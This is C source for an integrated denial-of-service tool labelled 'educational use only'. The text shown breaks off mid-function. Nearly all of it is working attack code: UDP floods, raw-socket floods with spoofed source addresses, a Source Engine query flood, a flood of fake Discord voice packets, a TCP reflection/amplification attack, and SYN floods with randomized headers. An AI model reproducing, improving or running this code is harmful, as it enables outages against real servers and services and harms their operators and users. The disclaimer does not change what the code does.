// main.c - Complete Integrated DDoS Tool (EDUCATIONAL USE ONLY)
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <signal.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <netinet/ip.h>
#include <netinet/tcp.h>
#include <netinet/udp.h>
#include <arpa/inet.h>
#include <netdb.h>
#include <curl/curl.h>
#include <fcntl.h>
#include <sys/select.h>
#include <stdint.h>
#include <stdbool.h>
#include <errno.h>
#include <sys/time.h>

// --- Constants ---
#define MAX_THREADS 4096
#define MAX_PACKET_SIZE 65535
#define PHI 0x9e3779b9
#define MAXTTL 255
#define MAX_SOCKETS 320
#define USERS_TO_SIMULATE 45
#define DEFAULT_PACKET_SIZE 1024

// --- Global State ---
volatile int running = 1;
volatile int limiter = 0;
volatile unsigned int pps = 0;
volatile unsigned int sleeptime = 100;
volatile unsigned int floodport = 0;
volatile long long total_success = 0;
volatile long long total_fail = 0;
volatile long long total_bytes = 0;
volatile unsigned int length_pkt = 0;

int attack_duration = 30;
int num_workers = 50;
char target_host[256];
int target_port = 80;
char attack_mode[50];
char sourceip[17];

// --- TCP-AMP Structures ---
struct list {
    struct sockaddr_in data;
    struct list *next;
    struct list *prev;
};

struct list *amp_head = NULL;
struct thread_amp_data { 
    int thread_id; 
    struct list *list_node; 
    struct sockaddr_in sin; 
};

// --- Attack Option Structures ---
struct attack_target {
    uint32_t addr;
    struct sockaddr_in sock_addr;
    uint8_t netmask;
};

struct attack_option {
    uint8_t val;
    uint32_t num;
};

// Attack option values
#define ATK_OPT_DPORT 0
#define ATK_OPT_SPORT 1
#define ATK_OPT_PAYLOAD_SIZE 2
#define ATK_OPT_PAYLOAD_RAND 3
#define ATK_OPT_IP_TOS 4
#define ATK_OPT_IP_IDENT 5
#define ATK_OPT_IP_TTL 6
#define ATK_OPT_IP_DF 7

// Table values
#define TABLE_ATK_VSE 0

// --- CMWC PRNG ---
static unsigned long int Q[4096], c = 362436;
static unsigned int cmwc_i = 4095;

void init_rand(unsigned long int x) {
    int i;
    Q[0] = x;
    Q[1] = x + PHI;
    Q[2] = x + PHI + PHI;
    for (i = 3; i < 4096; i++) {
        Q[i] = Q[i - 3] ^ Q[i - 2] ^ PHI ^ i;
    }
}

unsigned long int rand_cmwc(void) {
    unsigned long long int t, a = 18782LL;
    unsigned long int x, r = 0xfffffffe;
    cmwc_i = (cmwc_i + 1) & 4095;
    t = a * Q[cmwc_i] + c;
    c = (t >> 32);
    x = t + c;
    if (x < c) {
        x++;
        c++;
    }
    return (Q[cmwc_i] = r - x);
}

uint32_t rand_next(void) {
    return rand_cmwc() & 0xFFFFFFFF;
}

uint32_t rand_next_range(uint32_t min, uint32_t max) {
    if (min >= max) return min;
    return min + (rand_next() % (max - min + 1));
}

int randnum(int min_num, int max_num) {
    if (min_num == max_num) return min_num;
    if (min_num > max_num) {
        int temp = min_num;
        min_num = max_num;
        max_num = temp;
    }
    return min_num + (rand_cmwc() % (max_num - min_num + 1));
}

// --- Utility Functions ---
void rand_str(char *buf, int len) {
    int i;
    for (i = 0; i < len; i++) {
        buf[i] = rand_cmwc() % 256;
    }
}

// --- Checksum Functions ---
unsigned short csum(unsigned short *buf, int nwords) {
    unsigned long sum;
    for (sum = 0; nwords > 0; nwords--) {
        sum += *buf++;
    }
    sum = (sum >> 16) + (sum & 0xffff);
    sum += (sum >> 16);
    return (unsigned short)(~sum);
}

unsigned short checksum_generic(uint16_t *addr, int len) {
    return csum(addr, len / 2);
}

unsigned short checksum_tcpudp(struct iphdr *iph, void *transport_hdr, uint16_t transport_len) {
    struct pseudo_header {
        uint32_t src_addr;
        uint32_t dst_addr;
        uint8_t zero;
        uint8_t protocol;
        uint16_t length;
    } psh;
    
    psh.src_addr = iph->saddr;
    psh.dst_addr = iph->daddr;
    psh.zero = 0;
    psh.protocol = iph->protocol;
    psh.length = htons(transport_len);
    
    int total_len = sizeof(psh) + transport_len;
    unsigned short *buf = malloc(total_len);
    if (!buf) return 0;
    
    memcpy(buf, &psh, sizeof(psh));
    memcpy(buf + sizeof(psh)/2, transport_hdr, transport_len);
    
    unsigned short result = csum(buf, total_len / 2);
    free(buf);
    return result;
}

// --- Table System (Simplified) ---
char *vse_payload = "\xff\xff\xff\xff\x54\x53\x6f\x75\x72\x63\x65\x20\x45\x6e\x67\x69\x6e\x65\x20\x51\x75\x65\x72\x79\x00";
int vse_payload_len = 25;

void table_unlock_val(int id) {
    // Nothing needed for simplified version
}

char *table_retrieve_val(int id, int *len) {
    if (id == TABLE_ATK_VSE) {
        *len = vse_payload_len;
        return vse_payload;
    }
    *len = 0;
    return NULL;
}

// --- Attack Option Helpers ---
uint32_t attack_get_opt_int(uint8_t opts_len, struct attack_option *opts, uint8_t opt, uint32_t def) {
    int i;
    for (i = 0; i < opts_len; i++) {
        if (opts[i].val == opt) {
            return opts[i].num;
        }
    }
    return def;
}

// =============================================
// UDP FLOOD METHOD (Connected Sockets)
// =============================================
void* udp_flood_worker(void *arg) {
    char *target = (char *)arg;
    int fd;
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(target);
    
    if ((fd = socket(AF_INET, SOCK_DGRAM, 0)) == -1) {
        printf("Socket creation failed: %s\n", strerror(errno));
        return NULL;
    }
    
    // Set socket options for performance
    int buf_size = 1024 * 1024;
    setsockopt(fd, SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
    fcntl(fd, F_SETFL, O_NONBLOCK);
    
    // Bind to random source port
    struct sockaddr_in bind_addr = {0};
    bind_addr.sin_family = AF_INET;
    bind_addr.sin_port = 0; // Let system choose
    bind_addr.sin_addr.s_addr = INADDR_ANY;
    bind(fd, (struct sockaddr *)&bind_addr, sizeof(bind_addr));
    
    connect(fd, (struct sockaddr *)&sin, sizeof(sin));
    
    char *data = malloc(DEFAULT_PACKET_SIZE);
    if (!data) {
        close(fd);
        return NULL;
    }
    
    printf("Thread started for UDP-FLOOD\n");
    
    while (running) {
        rand_str(data, DEFAULT_PACKET_SIZE);
        if (send(fd, data, DEFAULT_PACKET_SIZE, MSG_NOSIGNAL) < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                break;
            }
            usleep(1000);
        } else {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, DEFAULT_PACKET_SIZE);
        }
        usleep(1000);
    }
    
    free(data);
    close(fd);
    return NULL;
}

// =============================================
// UDP BYPASS METHOD (Raw Sockets)
// =============================================
void* udp_bypass_raw_worker(void *arg) {
    char *target = (char *)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct udphdr *udph = (struct udphdr *)(iph + 1);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_addr.s_addr = inet_addr(target);
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0){
        printf("Socket creation failed (root required?): %s\n", strerror(errno));
        return NULL;
    }
    
    // Set socket to non-blocking
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    
    // Setup IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->id = htonl(rand()%54321);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_UDP;
    iph->check = 0;
    
    // Setup UDP header
    udph->source = htons(rand() % 65535);
    udph->dest = htons(floodport);
    udph->check = 0;
    
    // Setup payload
    int data_len = rand_next_range(700, 1000);
    rand_str((char *)(udph + 1), data_len);
    udph->len = htons(sizeof(struct udphdr) + data_len);
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct udphdr) + data_len;
    
    iph->daddr = sin.sin_addr.s_addr;
    
    int tmp = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        printf("Setsockopt failed: %s\n", strerror(errno));
        close(s);
        return NULL;
    }
    
    printf("Thread started for UDP-BYPASS-RAW\n");
    
    while(running) {
        // Randomize source IP and ports
        char ip[16];
        snprintf(ip, sizeof(ip), "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
        iph->saddr = inet_addr(ip);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        udph->source = htons(rand_cmwc() & 0xFFFF);
        
        iph->check = 0;
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
        udph->check = 0;
        
        int send_result = sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        if(send_result < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
                break;
            }
            usleep(1000);
        } else {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, iph->tot_len);
        }
        
        usleep(1000);
    }
    
    close(s);
    return NULL;
}

// =============================================
// VSE ATTACK METHOD
// =============================================
void* vse_attack_worker(void *arg) {
    char *target = (char *)arg;
    int fd;
    char packet[128];
    struct iphdr *iph = (struct iphdr *)packet;
    struct udphdr *udph = (struct udphdr *)(iph + 1);
    char *data = (char *)(udph + 1);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(27015); // VSE default port
    sin.sin_addr.s_addr = inet_addr(target);
    
    if ((fd = socket(AF_INET, SOCK_RAW, IPPROTO_RAW)) == -1) {
        printf("Socket creation failed (root required?): %s\n", strerror(errno));
        return NULL;
    }
    
    int opt = 1;
    if (setsockopt(fd, IPPROTO_IP, IP_HDRINCL, &opt, sizeof(opt)) == -1) {
        printf("Failed to set IP_HDRINCL: %s\n", strerror(errno));
        close(fd);
        return NULL;
    }
    
    // Setup fixed VSE payload
    table_unlock_val(TABLE_ATK_VSE);
    int vse_payload_len;
    char *vse_payload = table_retrieve_val(TABLE_ATK_VSE, &vse_payload_len);
    
    // Build packet
    iph->version = 4;
    iph->ihl = 5;
    iph->tos = 0;
    iph->tot_len = htons(sizeof(struct iphdr) + sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
    iph->id = htons(rand_next() % 65535);
    iph->ttl = 64;
    iph->frag_off = 0;
    iph->protocol = IPPROTO_UDP;
    
    udph->source = htons(rand_next() % 65535);
    udph->dest = htons(27015);
    udph->len = htons(sizeof(struct udphdr) + sizeof(uint32_t) + vse_payload_len);
    
    // VSE specific payload
    *((uint32_t *)data) = 0xffffffff;
    data += sizeof(uint32_t);
    memcpy(data, vse_payload, vse_payload_len);
    
    printf("Thread started for VSE-ATTACK\n");
    
    while (running) {
        // Randomize source IP
        char src_ip[16];
        snprintf(src_ip, sizeof(src_ip), "%d.%d.%d.%d", rand()%256, rand()%256, rand()%256, rand()%256);
        iph->saddr = inet_addr(src_ip);
        iph->daddr = sin.sin_addr.s_addr;
        
        // Randomize headers
        iph->id = htons(rand_next() % 65535);
        udph->source = htons(rand_next() % 65535);
        
        // Recalculate checksums
        iph->check = 0;
        iph->check = checksum_generic((uint16_t *)iph, sizeof(struct iphdr));
        udph->check = 0;
        udph->check = checksum_tcpudp(iph, udph, ntohs(udph->len));
        
        if (sendto(fd, packet, ntohs(iph->tot_len), MSG_NOSIGNAL, 
                  (struct sockaddr *)&sin, sizeof(sin)) == -1) {
            if (errno != EAGAIN && errno != EWOULDBLOCK) {
                break;
            }
        } else {
            __sync_fetch_and_add(&total_success, 1);
            __sync_fetch_and_add(&total_bytes, ntohs(iph->tot_len));
        }
        
        usleep(1000);
    }
    
    close(fd);
    return NULL;
}

// =============================================
// DISCORD ATTACK METHOD
// =============================================
void* discord_attack_worker(void *arg) {
    char *target = (char *)arg;
    int socks[MAX_SOCKETS];
    int active_sockets = 0;
    int i;
    
    // Create multiple sockets
    for (i = 0; i < MAX_SOCKETS && i < num_workers; i++) {
        socks[i] = socket(AF_INET, SOCK_DGRAM, 0);
        if (socks[i] < 0) continue;
        
        active_sockets++;
        
        // Socket options for performance
        int buf_size = 524288;
        setsockopt(socks[i], SOL_SOCKET, SO_SNDBUF, &buf_size, sizeof(buf_size));
        int reuse = 1;
        setsockopt(socks[i], SOL_SOCKET, SO_REUSEADDR, &reuse, sizeof(int));
        
        int tos_value = (i % 2 == 0) ? 0xb8 : 0x88;
        setsockopt(socks[i], IPPROTO_IP, IP_TOS, &tos_value, sizeof(int));
        fcntl(socks[i], F_SETFL, O_NONBLOCK);
        
        // Bind to random source port
        struct sockaddr_in src;
        src.sin_family = AF_INET;
        src.sin_port = htons(1024 + (rand_next() % 64000));
        src.sin_addr.s_addr = INADDR_ANY;
        bind(socks[i], (struct sockaddr *)&src, sizeof(src));
    }
    
    if (active_sockets == 0) {
        printf("Failed to create any sockets for Discord attack\n");
        return NULL;
    }
    
    struct sockaddr_in sin;
    sin.sin_family = AF_INET;
    sin.sin_port = htons(50001); // Discord voice port
    sin.sin_addr.s_addr = inet_addr(target);
    
    // Discord Opus patterns
    uint8_t discord_opus_pattern[8][16] = {
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x01},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x02},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x03},
        {0x80, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x04},
        {0x90, 0x78, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0xBE, 0xDE, 0x00, 0x05}
    };
    
    uint32_t ssrc_values[USERS_TO_SIMULATE];
    uint16_t seq[USERS_TO_SIMULATE];
    uint32_t ts[USERS_TO_SIMULATE];
    uint32_t base_ts = (uint32_t)time(NULL) * 48000;
    
    // Initialize user data
    for (int u = 0; u < USERS_TO_SIMULATE; u++) {
        ssrc_values[u] = 0x10000000 + (rand_next() % 0xEFFFFFFF);
        seq[u] = rand_next() % 1000;
        ts[u] = base_ts + u * 960;
    }
    
    char packet[200];
    printf("Thread started for DISCORD-ATTACK with %d sockets\n", active_sockets);
    
    while (running) {
        for (int i = 0; i < active_sockets; i++) {
            if (socks[i] < 0) continue;
            
            for (int user = 0; user < USERS_TO_SIMULATE && user < 10; user++) {
                int pattern_idx = rand_next() % 8;
                int packet_size = 160;
                
                memcpy(packet, discord_opus_pattern[pattern_idx], 16);
                
                // Set sequence number
                packet[2] = (seq[user] >> 8) & 0xFF;
                packet[3] = seq[user] & 0xFF;
                seq[user]++;
                
                // Set timestamp
                packet[4] = (ts[user] >> 24) & 0xFF;
                packet[5] = (ts[user] >> 16) & 0xFF;
                packet[6] = (ts[user] >> 8) & 0xFF;
                packet[7] = ts[user] & 0xFF;
                ts[user] += 960;
                
                // Set SSRC
                packet[8] = (ssrc_values[user] >> 24) & 0xFF;
                packet[9] = (ssrc_values[user] >> 16) & 0xFF;
                packet[10] = (ssrc_values[user] >> 8) & 0xFF;
                packet[11] = ssrc_values[user] & 0xFF;
                
                // Fill payload with random data
                for (int j = 16; j < packet_size; j++) {
                    packet[j] = rand_next() % 256;
                }
                
                // Send multiple bursts
                for (int burst = 0; burst < 3; burst++) {
                    if (sendto(socks[i], packet, packet_size, MSG_NOSIGNAL, 
                              (struct sockaddr *)&sin, sizeof(sin)) > 0) {
                        __sync_fetch_and_add(&total_success, 1);
                        __sync_fetch_and_add(&total_bytes, packet_size);
                    }
                }
            }
        }
        usleep(10000); // 10ms delay
    }
    
    // Cleanup sockets
    for (i = 0; i < active_sockets; i++) {
        if (socks[i] >= 0) close(socks[i]);
    }
    
    return NULL;
}

// =============================================
// TCP-AMP METHOD (Amplification Attack)
// =============================================
unsigned short tcpcsum_amp(struct iphdr *iph, struct tcphdr *tcph) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr));
    
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr);
    unsigned short *tcp = malloc(totaltcp_len);
    if (!tcp) return 0;
    
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr));
    
    unsigned short output = csum(tcp, totaltcp_len/2);
    free(tcp);
    return output;
}

void* tcp_amp_worker(void *par1) {
    struct thread_amp_data *td = (struct thread_amp_data *)par1;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    struct sockaddr_in sin = td->sin;
    struct list *list_node = td->list_node;
    
    if (!list_node) {
        printf("Error: No reflector nodes available\n");
        return NULL;
    }
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0){
        printf("Socket creation failed (root required?): %s\n", strerror(errno));
        return NULL;
    }
    
    // Set socket to non-blocking
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    
    init_rand(time(NULL));
    memset(datagram, 0, MAX_PACKET_SIZE);
    
    // Setup IP header
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr);
    iph->id = htonl(13373);
    iph->frag_off = 0;
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
    
    // Setup TCP header
    tcph->source = htons(5678);
    tcph->seq = htonl(rand_cmwc());
    tcph->ack_seq = 0;
    tcph->res2 = 0;
    tcph->doff = 5;
    tcph->syn = 1;
    tcph->window = htonl(65535);
    tcph->check = 0;
    tcph->urg_ptr = 0;
    
    tcph->dest = list_node->data.sin_port;
    iph->daddr = list_node->data.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    
    int tmp = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        printf("Error: setsockopt() - Cannot set HDRINCL! %s\n", strerror(errno));
        close(s);
        return NULL;
    }
    
    printf("Thread started for TCP-AMP with %d reflectors\n", 1);
    
    register unsigned int pmk = 0;
    while(running) {
        if(pmk % 2) {
            // Send from target to reflector
            iph->saddr = sin.sin_addr.s_addr;
            iph->daddr = list_node->data.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
            
            tcph->dest = list_node->data.sin_port;
            tcph->seq = htonl(rand_cmwc() & 0xFFFF);
            tcph->check = 0;
            tcph->check = tcpcsum_amp(iph, tcph);
            
            int send_result = sendto(s, datagram, iph->tot_len, 0, 
                                   (struct sockaddr *)&list_node->data, 
                                   sizeof(list_node->data));
            if (send_result > 0) {
                __sync_fetch_and_add(&total_success, 1);
                __sync_fetch_and_add(&total_bytes, iph->tot_len);
            }
            
            // Move to next reflector
            list_node = list_node->next;
            if (!list_node) list_node = amp_head;
            
        } else {
            // Send from reflector to target (spoofed)
            iph->saddr = list_node->data.sin_addr.s_addr;
            iph->daddr = sin.sin_addr.s_addr;
            iph->id = htonl(rand_cmwc() & 0xFFFFFF);
            iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
            
            tcph->seq = htonl(rand_cmwc() & 0xFFFF);
            tcph->source = list_node->data.sin_port;
            tcph->dest = sin.sin_port;
            tcph->check = 0;
            tcph->check = tcpcsum_amp(iph, tcph);
            
            int send_result = sendto(s, datagram, iph->tot_len, 0, 
                                   (struct sockaddr *)&sin, sizeof(sin));
            if (send_result > 0) {
                __sync_fetch_and_add(&total_success, 1);
                __sync_fetch_and_add(&total_bytes, iph->tot_len);
            }
        }
        pmk++;
        usleep(1000);
    }
    
    close(s);
    printf("TCP-AMP thread exiting\n");
    return NULL;
}

// =============================================
// NFO-TCP METHOD
// =============================================
unsigned short tcpcsum(struct iphdr *iph, struct tcphdr *tcph, int pipisize) {
    struct tcp_pseudo {
        unsigned long src_addr;
        unsigned long dst_addr;
        unsigned char zero;
        unsigned char proto;
        unsigned short length;
    } pseudohead;
    
    pseudohead.src_addr = iph->saddr;
    pseudohead.dst_addr = iph->daddr;
    pseudohead.zero = 0;
    pseudohead.proto = IPPROTO_TCP;
    pseudohead.length = htons(sizeof(struct tcphdr) + pipisize);
    
    int totaltcp_len = sizeof(struct tcp_pseudo) + sizeof(struct tcphdr) + pipisize;
    unsigned short *tcp = malloc(totaltcp_len);
    if (!tcp) return 0;
    
    memcpy((unsigned char *)tcp, &pseudohead, sizeof(struct tcp_pseudo));
    memcpy((unsigned char *)tcp + sizeof(struct tcp_pseudo), (unsigned char *)tcph, sizeof(struct tcphdr) + pipisize);
    
    unsigned short output = csum(tcp, totaltcp_len/2);
    free(tcp);
    return output;
}

void* nfo_tcp_worker(void *arg) {
    char *td = (char *)arg;
    char datagram[MAX_PACKET_SIZE];
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(iph + 1);
    struct sockaddr_in sin;
    
    sin.sin_family = AF_INET;
    sin.sin_port = htons(floodport);
    sin.sin_addr.s_addr = inet_addr(td);
    if (sin.sin_addr.s_addr == INADDR_NONE) {
        printf("Error: Invalid target address\n");
        return NULL;
    }
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s < 0){
        printf("Socket creation failed (root required?): %s\n", strerror(errno));
        return NULL;
    }
    
    // Set socket to non-blocking to prevent hangs
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    
    memset(datagram, 0, MAX_PACKET_SIZE);
    
    // IP header setup
    iph->ihl = 5;
    iph->version = 4;
    iph->tos = 0;
    iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + 24;
    iph->id = htonl(54321);
    iph->frag_off = htons(0x4000);
    iph->ttl = MAXTTL;
    iph->protocol = IPPROTO_TCP;
    iph->check = 0;
    iph->saddr = inet_addr("192.168.3.100");
    
    // TCP header setup
    tcph->source = htons(5678);
    tcph->check = 0;
    memcpy((void *)tcph + sizeof(struct tcphdr), "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00", 24);
    tcph->syn = 1;
    tcph->window = htons(64240);
    tcph->doff = 8; // (20 + 24)/4 = 11, but setting to 8 for standard header
    
    tcph->dest = htons(floodport);
    iph->daddr = sin.sin_addr.s_addr;
    iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
    
    int tmp = 1;
    if (setsockopt(s, IPPROTO_IP, IP_HDRINCL, &tmp, sizeof(tmp)) < 0) {
        printf("Setsockopt failed: %s\n", strerror(errno));
        close(s);
        return NULL;
    }
    
    init_rand(time(NULL));
    register unsigned int i = 0;
    
    // Window sizes and MSS values
    int windows[11] = {29200, 64240, 65535, 32855, 18783, 30201, 35902, 28400, 8192, 6230, 65320};
    int mssvalues[9] = {20, 52, 160, 180, 172, 19, 109, 59, 113};
    
    printf("Thread started for NFO-TCP\n");
    
    while(running) {
        // Packet construction
        tcph->check = 0;
        tcph->seq = htonl(rand_cmwc());
        tcph->doff = 8;
        tcph->dest = htons(floodport);
        
        iph->ttl = randnum(100, 130);
        iph->saddr = (rand_cmwc() >> 24 & 0xFF) << 24 | (rand_cmwc() >> 16 & 0xFF) << 16 | 
                     (rand_cmwc() >> 8 & 0xFF) << 8 | (rand_cmwc() & 0xFF);
        iph->id = htonl(rand_cmwc() & 0xFFFFFFFF);
        iph->check = csum((unsigned short *)datagram, iph->tot_len >> 1);
        
        tcph->source = htons(rand_cmwc() & 0xFFFF);
        tcph->dest = htons(floodport);
        tcph->check = tcpcsum(iph, tcph, 24);
        
        int send_result = sendto(s, datagram, iph->tot_len, 0, (struct sockaddr *)&sin, sizeof(sin));
        if(send_result < 0) {
            if (errno != EAGAIN && errno != EWOULDBLOCK && errno != ENOBUFS) {
                break;
            }
            usleep(1000);
            continue;
        }
        
        // TCP options modification
        char stronka[] = "\x02\x04\x05\x14\x01\x03\x03\x07\x01\x01\x08\x0a\x32\xb7\x31\x58\x00\x00\x00\x00\x04\x02\x00\x00";
        stronka[3] = mssvalues[rand_cmwc() % 9];
        stronka[7] = randnum(6, 11);
        stronka[12] = randnum(1, 250);
        stronka[13] = randnum(1, 250);
        stronka[14] = randnum(1, 250);
        stronka[15] = randnum(1, 250);
        
        tcph->window = htons(windows[rand_cmwc() % 11]);
        const char *newpayload = stronka;
        memcpy((void *)tcph + sizeof(struct tcphdr), newpayload, 24);
        
        pps++;
        if(i >= limiter) {
            i = 0;
            usleep(sleeptime);
        }
        i++;
        
        __sync_fetch_and_add(&total_success, 1);
        __sync_fetch_and_add(&total_bytes, iph->tot_len);
        
        usleep(10);
    }
    
    close(s);
    printf("Thread exiting\n");
    return NULL;
}

// =============================================
// SYBEX METHOD
// =============================================
unsigned short checksum_tcp_packet(unsigned short *ptr, int nbytes) {
    register long sum;
    unsigned short oddbyte;
    register short answer;
 
    sum=0;
    while(nbytes>1) {
        sum+=*ptr++;
        nbytes-=2;
    }
    if(nbytes==1) {
        oddbyte=0;
        *((unsigned char*)&oddbyte)=*(unsigned char*)ptr;
        sum+=oddbyte;
    }
 
    sum = (sum>>16)+(sum & 0xffff);
    sum = sum + (sum>>16);
    answer=(short)~sum;
     
    return(answer);
}

void* sybex_worker(void *arg) {
    char *targettr = (char *)arg;
    char datagram[4096], source_ip[32], *data, *pseudogram;
    memset(datagram, 0, 4096);
    
    struct iphdr *iph = (struct iphdr *)datagram;
    struct tcphdr *tcph = (struct tcphdr *)(datagram + sizeof(struct iphdr));
    struct sockaddr_in sin;
    struct pseudo_header {
        u_int32_t source_address;
        u_int32_t dest_address;
        u_int8_t placeholder;
        u_int8_t protocol;
        u_int16_t tcp_length;
    } psh;
    
    data = datagram + sizeof(struct iphdr) + sizeof(struct tcphdr);
    if (length_pkt == 0) {
        data = "";
    }
    
    sin.sin_family = AF_INET;
    int rdzeroport;
    
    if (floodport == 0) {
        rdzeroport = randnum(2, 65535);
        sin.sin_port = htons(rdzeroport);
        tcph->dest = htons(rdzeroport);
    } else {
        sin.sin_port = htons(floodport);
        tcph->dest = htons(floodport);
    }
    
    sin.sin_addr.s_addr = inet_addr(targettr);
    if (sin.sin_addr.s_addr == INADDR_NONE) {
        printf("Error: Invalid target address\n");
        return NULL;
    }
    
    int s = socket(AF_INET, SOCK_RAW, IPPROTO_RAW);
    if(s == -1) {
        printf("Socket creation failed (root required?): %s\n", strerror(errno));
        return NULL;
    }
    
    // Set socket to non-blocking
    int flags = fcntl(s, F_GETFL, 0);
    fcntl(s, F_SETFL, flags | O_NONBLOCK);
    
    printf("Thread started for SYBEX\n");
    
    while(running) {
        char primera[16];
        int one_r = randnum(1, 250);
        int two_r = randnum(1, 250);
        int three_r = randnum(1, 250);
        int four_r = randnum(1, 250);
        snprintf(primera, sizeof(primera), "%d.%d.%d.%d", one_r, two_r, three_r, four_r);
        strcpy(source_ip, primera);
        
        // IP header
        iph->ihl = 5;
        iph->version = 4;
        iph->tos = 0;
        iph->tot_len = sizeof(struct iphdr) + sizeof(struct tcphdr) + strlen(data);
        iph->id = htons(1);
        iph->frag_off = 0;
        iph->ttl = 64;
        iph->protocol = IPPROTO_TCP;
        iph->check = 0;
        iph->saddr = inet_addr(source_ip);
        iph->daddr = sin.sin_addr.s_addr;
        iph->check = checksum_tcp_packet((unsigned short *)datagram, iph->tot_len);
        
        int randSeq = randnum(10000, 99999);
        int randAckSeq = randnum(10000, 99999);
        int randSP = randnum(2, 65535);
        int randWin = randnum(1000, 9999);
        
        // TCP header
        tcph->source = htons(randSP);
        tcph->seq = htonl(randSeq);
        tcph->ack_seq = 0;
        tcph->doff = 5;
        tcph->fin=0;
        tcph->syn=1;
        tcph->rst=0;
        tcph->psh=0;
        tcph->ack=0;
        tcph->urg=0;
        tcph->window = htons(randWin);
        tcph->check = 0;
        tcph->urg_ptr = 0;
        
        psh.source_address = inet_addr(source_ip);
        psh.dest_address = sin.sin_addr.s_addr;
        psh.placeholder = 0;
        psh.protocol = IPPROTO_TCP;
        psh.tcp_length = htons(sizeof(struct tcphdr) + strlen(data));
        
        int psize = sizeof(struct pseudo_header) + sizeof(struct tcphdr) + strlen(data);
        pseudogram = malloc(psize);
        if (!pseudogram) {
            usleep(1000);
            continue;
        }
        
        memcpy(pseudogram, (char*)&psh, sizeof(struct pseudo_header));
